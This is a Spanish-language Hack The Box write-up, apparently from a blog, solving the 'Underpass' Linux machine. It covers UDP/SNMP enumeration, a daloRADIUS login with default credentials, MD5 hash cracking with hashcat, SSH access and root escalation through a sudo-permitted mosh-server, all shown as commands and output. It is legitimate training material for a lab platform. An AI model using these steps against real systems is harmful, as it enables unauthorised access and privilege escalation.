---
title: UnderPass
description: Underpass es una máquina Linux de dificultad fácil que comienza con una página predeterminada de Apache Ubuntu. Esto lleva al atacante a enumerar los puertos UDP de la máquina en busca de vectores de ataque alternativos. Se puede enumerar SNMP y descubrir que Daloradius está ejecutándose en la máquina remota, y el panel de administración es accesible usando credenciales por defecto. Dentro del panel, se encuentra almacenado el hash de la contraseña del usuario svcMosh, el cual puede ser crackeado. Luego, el atacante puede iniciar sesión en la máquina remota mediante SSH con las credenciales obtenidas. El usuario svcMosh está configurado para ejecutar mosdh-server como root, lo que permite al atacante conectarse desde su máquina local e interactuar con la máquina remota como usuario root. 
date: 2024-12-23
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-underpass/underpass_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - tcp
  - udp
  - ssh
  - http
  - snmp
  - misconfigurations
  - data_leaks
  - password_attacks
  - sudo_abuse
  - information_gathering
  - misconfiguration_exploitation
  - data_leak_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ ping -c 1 10.10.11.48
PING 10.10.11.48 (10.10.11.48) 56(84) bytes of data.
64 bytes from 10.10.11.48: icmp_seq=1 ttl=127 time=334 ms

--- 10.10.11.48 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 334.216/334.216/334.216/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.48 -oG nmap1
Host: 10.10.11.48 ()	Status: Up
Host: 10.10.11.48 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ sudo nmap -sCV -p22,80 -vvv -oN nmap2 10.10.11.48
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/underpass:-$ whatweb 10.10.11.48
http://10.10.11.48 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.48], Title[Apache2 Ubuntu Default Page: It works]
```

El puerto 80 muestra un servidor Apache con la plantilla por defecto de Ubuntu. No obtengo mas información adicional desde el navegador.

![](assets/img/htb-writeup-underpass/underpass1_1.png)

El sitio web no contiene contenido interesante, por tanto decido realizar un escaneo de puertos UDP, apuntando a descubrir otros servicios.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ sudo nmap -p- --open -sU --min-rate 5000 -n -Pn -vvv 10.10.11.48 -oG nmap1_2

/home/kali/Documents/htb/machines/underpass:-$ cat nmap1_2 | grep -oP '\d{1,5}/open/udp'
161/open/udp
```

El escaneo revela que el puerto UDP 161 está abierto, lo cual indica un servicio SNMP disponible. El banner incluye una cadena inusual `UnDerPass.htb is the only daloradius server in the basin!`.

Procedo a enumerar el servicio SNMP con más detalle. Y revela que el servidor SNMP utiliza Net-SNMP, y entrega múltiples datos como el sistema operativo, kernel y el nombre de host.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ sudo nmap -sCVU -p161 -vvv 10.10.11.48 -oN nmap2_2
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 29
|_  snmpEngineTime: 3h22m48s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 3h22m49.58s (1216958 timeticks)
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
```

Dado el nombre revelado, agrego la entrada al archivo `/etc/hosts`.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ echo '10.10.11.48\tunderpass.htb' | sudo tee -a /etc/hosts
```

Posteriormente, intento enumerar credenciales mediante fuerza bruta con el script `snmp-brute`. Y el resultado confirma el uso de la comunidad `public` como válida.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ sudo nmap --script snmp-brute -sU -p161 10.10.11.48 -oN nmap2_3
PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|_  public - Valid credentials
```

Con estas credenciales, realizo una consulta extensa del árbol MIB.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ snmpwalk -c public -v2c 10.10.11.48 .
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (1342235) 3:43:42.35
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (67) 0:00:00.67
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (1344208) 3:44:02.08
iso.3.6.1.2.1.25.1.2.0 = STRING: ".....7.+.."
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 1
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 221
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

El nombre daloradius llama particularmente la atención, una búsqueda en línea sugiere que `daloRADIUS` es una interfaz web para la administración de `FreeRADIUS`. Con esto, intento acceder a una ruta comúnmente asociada a esta herramienta.

El servidor responde con un `403 Forbidden`, lo que confirma la existencia del directorio `/daloradius/` y el uso de este software.

![](assets/img/htb-writeup-underpass/underpass1_2.png)

---
## Misconfiguration & Data Leak Exploitation

Consultando [documentacion](https://kb.ct-group.com/radius-holding-post-watch-this-space/) relacionada con daloRADIUS, encuentro una ruta directa hacia la interfaz de login.

Mediante una búsqueda adicional, descubro que las credenciales por defecto de la plataforma son `administrator`:`radius`. Credenciales resultan válidas para iniciar sesión.

![](assets/img/htb-writeup-underpass/underpass1_3.png)

Una vez autenticado, accedo al dashboard con privilegios administrativos.

![](assets/img/htb-writeup-underpass/underpass1_4.png)

Dentro del panel, en la sección `Management` > `Users Listing`, identifico un usuario llamado `svcMosh` junto a una cadena que aparenta ser una contraseña cifrada.

![](assets/img/htb-writeup-underpass/underpass1_5.png)

En este caso, hashcat indica que el hash es del tipo MD5. Por tanto, procedo a crackear el hash mediante fuerza bruta.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ hashcat --show '412DD4759978ACFCC81DEAB01B382403'
   # | Name                                            | Category
=====+=================================================+==============================
   0 | MD5                                             | Raw Hash

/home/kali/Documents/htb/machines/underpass:-$ hashcat -m 0 -a 0 '412DD4759978ACFCC81DEAB01B382403' /usr/share/wordlists/rockyou.txt
412dd4759978acfcc81deab01b382403:underwaterfriends
```

Confirmo que las credenciales `svcMosh`:`underwaterfriends` permiten una conexión exitosa al servicio SSH.

```terminal
/home/kali/Documents/htb/machines/underpass:-$ ssh svcMosh@underpass.htb
svcMosh@underpass.htb's password: underwaterfriends

svcMosh@underpass:~$ cat user.txt
```

---
## Privilege Escalation

Solo los usuarios `root` y `svcMosh` disponen de una shell interactiva, lo que indica que no hay otros usuarios privilegiados configurados con acceso directo.

```terminal
svcMosh@underpass:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
svcMosh:x:1002:1002:svcMosh,60001,8675309,8675309:/home/svcMosh:/bin/bash
```

Consulto los permisos de sudo para el usuario actual y muestra que `svcMosh` puede ejecutar `/usr/bin/mosh-server` como cualquier usuario, incluido `root`, sin requerir contraseña.

```terminal
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

La ayuda del binario confirma que es posible ejecutar un comando arbitrario utilizando el delimitador `--`, lo cual representa una vía potencial de escalada de privilegios

```terminal
svcMosh@underpass:~$ /usr/bin/mosh-server -h
Usage: /usr/bin/mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
```

Al ajecutar la herramienta, se inicia un proceso en segundo plano, escuchando en el puerto 60001. A partir del mensaje generado `MOSH CONNECT 60001`, infiero que es necesario un cliente que se conecte a ese puerto.

```terminal
svcMosh@underpass:~$ /usr/bin/mosh-server

MOSH CONNECT 60001 dXHFz0SmFBIZ1R9O2f4ooQ

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 4926]
```

Intento conectarme directamente como el cliente, pero se requiere que se defina la variable de entorno `MOSH_KEY`, la cual es provista por el servidor en el mensaje de conexión inicial.

```terminal
svcMosh@underpass:~$ mosh-client
mosh-client (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Usage: mosh-client [-# 'ARGS'] IP PORT
       mosh-client -c

svcMosh@underpass:~$ mosh-client 127.0.0.1 60001
MOSH_KEY environment variable not found.
```

---

El servidor devuelve un mensaje `MOSH CONNECT` con un valor de clave que copio para reutilizar.

```terminal
svcMosh@underpass:~$ sudo /usr/bin/mosh-server

MOSH CONNECT 60001 3kDMiHnrUcJOuBeRPPMODQ

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 4926]
```

Utilizo dicha clave en la variable de entorno `MOSH_KEY` y lanzo el cliente apuntando al puerto 60001. Esto inicia una sesión como `root`, confirmando la escalada de privilegios.

```terminal
svcMosh@underpass:~$ MOSH_KEY=3kDMiHnrUcJOuBeRPPMODQ mosh-client 127.0.0.1 60001

root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)

root@underpass:~# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/641" target="_blank">Underpass Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }
